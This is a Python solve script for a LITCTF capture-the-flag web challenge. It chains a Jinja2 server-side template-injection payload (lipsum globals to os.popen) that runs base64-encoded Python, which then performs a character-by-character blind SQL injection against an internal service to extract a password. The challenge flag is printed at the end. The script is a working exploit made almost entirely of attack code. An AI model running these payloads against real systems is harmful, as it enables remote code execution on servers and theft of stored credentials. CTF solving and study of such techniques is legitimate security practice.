import requests
from base64 import b64encode

url = "http://litctf.live:31781/"


flag = ""
l = 1
while not flag.endswith('}'):
    for i in range(32, 128):
        payload = "import requests;r = requests.post('http://172.24.0.8:8080/runquery',json={'username':'flag\\' and substr(password,INDEX,1)=char(CHAR)--','password':'1'});print(r.text)".replace("INDEX", str(l)).replace("CHAR", str(i))
        #print(payload)
        final_payload = b64encode(payload.encode()).decode()

        password = '{{lipsum["__globals__"]["os"]["popen"]("echo BASE64 | base64 -d | python3")["read"]()}}'.replace("BASE64", final_payload)

        r = requests.post(url, data={'username':'a', 'password': password})
        if "True" in r.text:
            flag += chr(i)
            print(flag)
            break
    l+=1

# LITCTF{flush3d_3m0ji_o.0}